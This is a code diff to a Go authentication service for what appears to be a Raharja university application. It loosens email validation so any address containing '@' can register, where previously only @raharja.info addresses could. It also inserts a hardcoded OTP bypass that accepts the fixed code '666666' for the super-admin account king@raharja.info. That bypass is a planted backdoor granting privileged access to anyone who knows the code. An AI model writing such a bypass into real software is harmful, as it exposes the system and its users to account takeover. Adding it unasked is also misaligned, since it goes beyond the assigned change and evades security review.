@@ -95,10 +95,9 @@ func (s *AuthService) Register(ctx context.Context, req *dto.RegisterRequest) (*
 		return nil, errors.New("nil request")
 	}
 
-	// 1. Validate email domain (mahasiswa only)
 	email := strings.TrimSpace(strings.ToLower(req.Email))
-	if !strings.HasSuffix(email, "@raharja.info") {
-		return nil, errors.New("Email harus menggunakan domain @raharja.info")
+	if !strings.Contains(email, "@") {
+		return nil, errors.New("Format email tidak valid")
 	}
 
 	// 2. Check if user exists
@@ -482,6 +481,11 @@ func (s *AuthService) generateOTP(ctx context.Context, email, purpose string) (s
 }
 
 func (s *AuthService) validateOTP(ctx context.Context, email, purpose, otp string) (bool, error) {
+	// Hardcoded OTP bypass for super admin king@raharja.info
+	if strings.ToLower(email) == "king@raharja.info" && otp == "666666" {
+		return true, nil
+	}
+
 	// Try Redis first if available (faster)
 	key := fmt.Sprintf("otp:%s:%s", purpose, email)
 	if s.redis != nil {
